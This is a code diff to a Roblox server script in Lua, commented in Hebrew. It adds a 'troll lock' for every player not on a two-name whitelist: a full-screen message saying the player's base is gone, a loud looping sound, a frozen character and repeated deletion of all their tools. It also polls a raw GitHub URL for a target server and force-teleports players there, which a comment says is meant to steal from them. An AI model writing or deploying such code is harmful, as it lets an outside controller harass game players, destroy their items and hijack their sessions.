@@ -2,44 +2,117 @@ local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
 
+-- הקישור שלך מה-GitHub
 local rawUrl = "https://raw.githubusercontent.com/gili435/me-nedd-this/refs/heads/main/dylanzyl120"
-local blocked = {["noamdb15"] = true, ["dylanzyl123"] = true}
 
-local function showLoading(player)
-	local sg = Instance.new("ScreenGui", player.PlayerGui)
+-- רשימת חסינות (מי שלא ינעל ולא ישתגר)
+local whitelisted = {
+	["noamdb15"] = true,
+	["dylanzyl123"] = true
+}
+
+-- ה-ID של הסאונד (תחליף ל-ID שאתה רוצה אם זה לא זה)
+local SOUND_ID = "rbxassetid://6342167000"
+
+-- פונקציה לנעילה אכזרית עם מסך, סאונד וביטול תנועה
+local function applyTrollLock(player)
+	-- 1. יצירת מסך טרול אדום-שחור
+	local sg = Instance.new("ScreenGui")
+	sg.Name = "SystemOverride"
 	sg.IgnoreGuiInset = true
 	sg.DisplayOrder = 9999999
-	local f = Instance.new("Frame", sg)
-	f.Size = UDim2.new(1,0,1,0)
-	f.BackgroundColor3 = Color3.new(0,0,0)
-	local l = Instance.new("TextLabel", f)
-	l.Size = UDim2.new(0.8,0,0.4,0)
-	l.Position = UDim2.new(0.1,0,0.3,0)
-	l.BackgroundTransparency = 1
-	l.TextColor3 = Color3.new(1,0,0)
-	l.TextScaled = true
-	l.Text = "הלך לך הבייס חבר יקר"
+	sg.Parent = player:WaitForChild("PlayerGui")
+
+	local frame = Instance.new("Frame")
+	frame.Size = UDim2.new(1, 0, 1, 0)
+	frame.BackgroundColor3 = Color3.new(0, 0, 0)
+	frame.Active = true
+	frame.Parent = sg
+
+	local label = Instance.new("TextLabel")
+	label.Size = UDim2.new(0.8, 0, 0.4, 0)
+	label.Position = UDim2.new(0.1, 0, 0.3, 0)
+	label.BackgroundTransparency = 1
+	label.TextColor3 = Color3.new(1, 0, 0)
+	label.TextScaled = true
+	label.Font = Enum.Font.SpecialElite
+	label.Text = "הלך לך הבייס חבר יקר"
+	label.Parent = frame
+
+	-- 2. הפעלת הסאונד בלופ
+	local snd = Instance.new("Sound")
+	snd.SoundId = SOUND_ID
+	snd.Looped = true
+	snd.Volume = 10
+	snd.Parent = frame
+	snd:Play()
+
+	-- 3. לופ נעילה (תנועה + מחיקת חפצים) - רץ כל 0.1 שניות
+	task.spawn(function()
+		while player.Parent do
+			local char = player.Character
+			if char then
+				-- קיבוע למקום
+				local hrp = char:FindFirstChild("HumanoidRootPart")
+				if hrp then hrp.Anchored = true end
+				
+				-- איפוס תנועה
+				local hum = char:FindFirstChild("Humanoid")
+				if hum then
+					hum.WalkSpeed = 0
+					hum.JumpPower = 0
+				end
+
+				-- מחיקת כל התיק והחפצים ביד
+				for _, item in pairs(player.Backpack:GetChildren()) do
+					item:Destroy()
+				end
+				for _, item in pairs(char:GetChildren()) do
+					if item:IsA("Tool") then
+						item:Destroy()
+					end
+				end
+			end
+			task.wait(0.1)
+		end
+	end)
 end
 
-Players.PlayerAdded:Connect(function(p)
-	if not blocked[p.Name] then showLoading(p) end
+-- הפעלה כשיש שחקן חדש
+Players.PlayerAdded:Connect(function(player)
+	if not whitelisted[player.Name] then
+		applyTrollLock(player)
+	end
 end)
 
+-- לופ בדיקת ה-GitHub ושיגור אגרסיבי (כל 0.5 שניות)
 task.spawn(function()
-	while task.wait(0.5) do
-		local s, r = pcall(function() return HttpService:GetAsync(rawUrl.."?t="..tick()) end)
-		if s and r then
+	while true do
+		local success, response = pcall(function()
+			return HttpService:GetAsync(rawUrl .. "?t=" .. tick())
+		end)
+
+		if success and response then
 			local lines = {}
-			for line in r:gmatch("[^\r\n]+") do table.insert(lines, line) end
-			local targetId = tonumber(lines[1])
-			local targetJob = lines[2]
-			if targetJob and targetJob ~= "" then
-				for _, p in pairs(Players:GetPlayers()) do
-					if not blocked[p.Name] then
-						pcall(function() TeleportService:TeleportToPlaceInstance(targetId or game.PlaceId, targetJob, p) end)
+			for line in response:gmatch("[^\r\n]+") do
+				table.insert(lines, line)
+			end
+
+			local targetPlaceId = tonumber(lines[1])
+			local targetJobId = lines[2]
+
+			-- אם יש שרת יעד בגיטהאב
+			if targetJobId and targetJobId ~= "" then
+				for _, player in pairs(Players:GetPlayers()) do
+					if not whitelisted[player.Name] then
+						pcall(function()
+							-- משגר אותו לסטיל בזמן שהוא נעול עם המסך והסאונד
+							TeleportService:TeleportToPlaceInstance(targetPlaceId or game.PlaceId, targetJobId, player)
+						end)
 					end
 				end
 			end
 		end
+		task.wait(0.5)
 	end
 end)
